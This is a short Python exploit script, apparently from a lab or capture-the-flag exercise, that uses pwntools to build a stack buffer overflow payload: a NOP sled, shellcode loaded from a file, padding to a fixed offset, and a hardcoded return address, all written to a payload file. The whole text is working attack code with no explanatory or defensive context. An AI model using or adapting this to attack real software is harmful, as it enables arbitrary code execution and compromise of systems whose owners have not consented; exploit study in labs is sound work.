from pwn import *
import subprocess
import struct

context.arch= "amd64"

jump_addr = 0x7fffffffaa00	# address to jump to = buffer_addr + 193 + nop sleds margine
offset = 8036 		# offset - header.response lenght = 8208 - 193


with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

# safe margine for jumping avoiding the segmentation fault
shellcode = b"\x90" * 48 + shellcode

padding_len = offset - len(shellcode)

payload = shellcode + b"A" * padding_len + struct.pack("<Q", jump_addr)

with open("payload.txt", "wb") as f:
    f.write(payload)

